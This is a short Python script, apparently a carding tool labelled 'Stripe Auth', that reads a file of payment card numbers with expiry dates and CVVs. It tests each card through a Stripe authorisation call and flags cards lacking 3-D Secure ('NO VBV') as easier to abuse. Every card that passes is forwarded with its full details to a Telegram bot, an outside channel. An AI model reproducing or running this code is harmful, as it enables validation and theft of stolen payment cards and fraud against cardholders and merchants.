from api import voidex, console
import os
def is_card_3d(status):
    if status in ['authenticate_attempt_successful', 'authenticate_successful']:

        return f"NO VBV ✅ ({status})"
    
    elif status == '':
        return 'Unknown ❌'
    else:
        return f"VBV ❌ ({status})"
    
def main():

    console.session_name = "Stripe Auth"

    filename = voidex.get_filename()

    if not os.path.exists(filename):
        console.error(f"No file exists with name '{filename}'")
        return
    
    with open(filename, "r", encoding="utf-8") as file:
        cardData = file.read()

    listas = voidex.create_lista_(cardData)
    if not listas:
        console.error("No cards found in {fln}".format(fln=filename))
        return
    
    console.info(f"Found {len(listas)} cards in {filename}")

    
    for card in listas:

        console.info(f"Processing card: {card}")
        ccn,mes,ano,cvv = card.split("|")[:4]
        mes =  "0"+mes if len(mes) == 1 else mes
        ano =  "20"+ano if len(ano) == 2 else ano
        card = "|".join([ccn, mes, ano, cvv])

        response = voidex.stripe_auth(card)
        bin_data = voidex.vbv_lookup(card)
        # print(bin_data)
        vbv_status = bin_data.get('vbv_status', '')
        vbv_status = is_card_3d(vbv_status)

        # check if vbv lookup is failed 
        if bin_data.get('error'):
            bin_data = response.get('bin_data')
        
        # print(bin_data)

        bin_info = ""
        if bin_data:
            bin_info = f"| BIN Info: {bin_data['bank']} - {bin_data['country']}"
        
        state =  response.get('success', False)
        if state:
            success_msg = response.get('message', 'Succeeded')
            console.success(f" {card} | <green> {success_msg} </green> {bin_info} | VBV Status: {vbv_status}")

            # send telegram message here
            if voidex.chat_id and voidex.bot_token:
                forward_data = (
                    f"*Card*: `{card}`\n"
                    f"*Status*: {success_msg} ✅\n"
                    f"*Bin Info*: {bin_info}\n"
                    f"*VBV Status*: `{vbv_status}`"
                )
                voidex._forwarder(forward_data)
        else:
            error = response.get('error', 'Unknown Error')
            console.warning(f" {card} | <red> {error} </red> {bin_info} | VBV Status: {vbv_status}")
    
    print("\n\nFinished!")


if __name__ == "__main__":
    main()